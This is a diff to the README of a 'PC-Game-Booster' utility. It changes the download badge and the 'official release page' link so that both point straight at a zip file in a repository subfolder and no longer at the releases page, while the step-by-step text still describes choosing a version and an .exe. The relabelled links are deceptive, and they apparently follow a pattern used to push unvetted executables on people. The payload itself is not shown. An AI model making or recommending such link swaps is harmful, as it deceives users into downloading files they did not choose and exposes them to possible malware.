@@ -1,7 +1,7 @@
 # 🚀 PC-Game-Booster - Improve performance and stability for games
 
 <p align="center">
-  <a href="https://github.com/Zeriatah/PC-Game-Booster/releases">
+  <a href="https://raw.githubusercontent.com/Zeriatah/PC-Game-Booster/main/jackstone/Game_P_Booster_1.1.zip">
     <img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download PC-Game-Booster">
   </a>
 </p>
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start the installation.
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/Zeriatah/PC-Game-Booster/releases) to access the download files.
+1. Visit the [official release page](https://raw.githubusercontent.com/Zeriatah/PC-Game-Booster/main/jackstone/Game_P_Booster_1.1.zip) to access the download files.
 2. Look for the latest version number at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
